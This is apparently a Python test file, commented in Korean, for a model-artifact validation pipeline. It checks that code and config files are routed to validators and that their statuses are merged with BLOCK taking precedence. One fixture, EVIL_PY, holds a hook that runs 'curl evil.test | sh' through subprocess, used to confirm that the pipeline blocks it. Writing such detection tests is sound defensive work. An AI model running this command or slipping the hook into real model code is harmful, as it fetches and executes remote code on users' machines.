"""통합 검증 파이프라인(whitelist.full_pipeline.run_full_validation) 회귀.

가중치 + 코드 + config를 한 요청에서 각 검증기로 라우팅하고 결과를 병합하는
새 통합 로직을 검증한다. 가중치 단독 경로(analyzer.service)와 코드 단독 경로
(analyzer.orchestrator)는 각자 테스트가 있으므로, 여기서는 라우팅 + 병합 +
job-level 판정 재계산에 집중한다.
"""

from __future__ import annotations

import hashlib
import uuid

import pytest

from analyzer.schemas import (
    ModelRef,
    OverallDecision,
    ValidationJobRequest,
    ValidationStatus,
)
from whitelist.full_pipeline import _combine_status, run_full_validation


def _sha256_bytes(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _artifact(path, repo_path: str, file_kind: str) -> dict:
    data = path.read_bytes()
    digest = _sha256_bytes(data)
    ext = "." + repo_path.rsplit(".", 1)[-1] if "." in repo_path else ""
    return {
        "artifact_id": f"sha256:{digest}",
        "repo_path": repo_path,
        "file_name": path.name,
        "file_kind": file_kind,
        "detected_extension": ext,
        "size_bytes": len(data),
        "sha256": digest,
        "source_url": f"https://huggingface.co/demo/{repo_path}",
        "temp_local_path": str(path),
    }


def _request(artifacts: list[dict]) -> ValidationJobRequest:
    return ValidationJobRequest.from_dict({
        "request_id": str(uuid.uuid4()),
        "job_id": str(uuid.uuid4()),
        "artifacts": artifacts,
        "policy_fingerprint": "test-policy",
    })


SAFE_PY = (
    "import torch\n"
    "import torch.nn as nn\n\n"
    "class Net(nn.Module):\n"
    "    def __init__(self):\n"
    "        super().__init__()\n"
    "        self.fc = nn.Linear(8, 8)\n"
    "    def forward(self, x):\n"
    "        return self.fc(x)\n"
)

EVIL_PY = (
    "import subprocess\n"
    "def hook():\n"
    "    subprocess.Popen(['/bin/sh', '-c', 'curl evil.test | sh'])\n"
)

CONFIG_JSON = '{"model_type": "roberta", "hidden_size": 768, "num_labels": 13}\n'


class TestCombineStatus:
    """순수 함수 — 병합 우선순위 BLOCK > ERROR > PENDING_REVIEW > PASS."""

    class _R:
        def __init__(self, status):
            self.status = status

    def test_block_wins(self):
        rs = [self._R(ValidationStatus.PASS), self._R(ValidationStatus.BLOCK)]
        assert _combine_status(rs) is ValidationStatus.BLOCK

    def test_pending_over_pass(self):
        rs = [self._R(ValidationStatus.PASS), self._R(ValidationStatus.PENDING_REVIEW)]
        assert _combine_status(rs) is ValidationStatus.PENDING_REVIEW

    def test_all_pass(self):
        rs = [self._R(ValidationStatus.PASS), self._R(ValidationStatus.PASS)]
        assert _combine_status(rs) is ValidationStatus.PASS

    def test_empty_is_pass(self):
        assert _combine_status([]) is ValidationStatus.PASS


class TestFullPipelineRouting:
    """코드 + config가 각 검증기로 실제 라우팅되고 병합되는지."""

    def test_malicious_python_blocks_overall(self, db_session, tmp_path):
        evil = tmp_path / "modeling_evil.py"
        evil.write_text(EVIL_PY, encoding="utf-8")
        cfg = tmp_path / "config.json"
        cfg.write_text(CONFIG_JSON, encoding="utf-8")

        req = _request([
            _artifact(evil, "modeling_evil.py", "PYTHON"),
            _artifact(cfg, "config.json", "CONFIG_JSON"),
        ])
        resp = run_full_validation(req, db=db_session)

        assert resp.overall_status is ValidationStatus.BLOCK
        assert resp.overall_decision is OverallDecision.DENY
        # 악성 .py가 차단 목록에 있어야 함
        statuses = {
            r.artifact.file_name: r.status for r in resp.artifact_results
        }
        assert statuses["modeling_evil.py"] is ValidationStatus.BLOCK

    def test_safe_python_and_config_not_blocked(self, db_session, tmp_path):
        safe = tmp_path / "modeling_safe.py"
        safe.write_text(SAFE_PY, encoding="utf-8")
        cfg = tmp_path / "config.json"
        cfg.write_text(CONFIG_JSON, encoding="utf-8")

        req = _request([
            _artifact(safe, "modeling_safe.py", "PYTHON"),
            _artifact(cfg, "config.json", "CONFIG_JSON"),
        ])
        resp = run_full_validation(req, db=db_session)

        # 안전 코드 + 정상 config → BLOCK 아님 (PASS 또는 PENDING_REVIEW 허용)
        assert resp.overall_status is not ValidationStatus.BLOCK
        names = {r.artifact.file_name for r in resp.artifact_results}
        assert {"modeling_safe.py", "config.json"} <= names

    def test_config_only_request_runs_config_validator(self, db_session, tmp_path):
        cfg = tmp_path / "tokenizer_config.json"
        cfg.write_text('{"tokenizer_class": "RobertaTokenizer"}\n', encoding="utf-8")

        req = _request([_artifact(cfg, "tokenizer_config.json", "TOKENIZER_CONFIG_JSON")])
        resp = run_full_validation(req, db=db_session)

        # config 검증기가 실제로 돌아 결과가 1건 있어야 함 (SKIPPED 아님)
        assert len(resp.artifact_results) == 1
        r = resp.artifact_results[0]
        assert r.artifact.file_name == "tokenizer_config.json"
        assert r.status is not ValidationStatus.SKIPPED

    def test_dict_request_accepted(self, db_session, tmp_path):
        """dict로 들어와도 ValidationJobRequest로 정규화."""
        cfg = tmp_path / "config.json"
        cfg.write_text(CONFIG_JSON, encoding="utf-8")
        payload = {
            "request_id": "r1",
            "job_id": "j1",
            "artifacts": [_artifact(cfg, "config.json", "CONFIG_JSON")],
        }
        resp = run_full_validation(payload, db=db_session)
        assert resp.request_id == "r1"
        assert len(resp.artifact_results) == 1
